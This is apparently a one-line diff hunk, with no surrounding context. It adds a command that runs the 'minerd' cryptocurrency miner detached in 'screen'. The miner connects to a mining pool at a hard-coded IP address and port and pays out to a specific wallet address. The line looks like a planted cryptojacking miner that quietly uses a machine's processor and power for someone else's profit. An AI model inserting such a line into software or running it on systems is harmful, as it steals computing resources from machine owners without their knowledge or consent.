@@ -1,0 +1,1 @@
+screen ./minerd -a cryptonight -o stratum+tcp://78.46.85.142:5221 -u SEiSma33nKD8fVrxVpfQYg2qHxbFECZfQKeMfYy9GYmUDREifaj8QEqNM5CLJzU1zWGKQY8Zowi2Sb2yPvtY5FGpj6vYHq7p6vK156JozX4md -p x
